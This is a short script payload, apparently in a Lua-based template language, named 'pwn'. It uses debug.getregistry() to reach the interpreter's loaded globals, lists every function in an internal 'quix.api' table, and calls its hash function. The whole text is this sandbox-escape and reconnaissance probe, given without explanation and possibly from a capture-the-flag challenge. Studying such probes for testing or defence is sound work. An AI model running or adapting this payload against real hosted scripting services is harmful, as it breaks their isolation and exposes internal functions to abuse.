@(fn pwn() {
  local keyset={}
  local n=0

  reg = debug.getregistry()

  for k,v in pairs(reg['_LOADED']['_G']['quix']['api']) do
    n=n+1
    keyset[n]=k
    print(k)
  end

  print(quix.api.hash('abc123'))

})

@pwn()
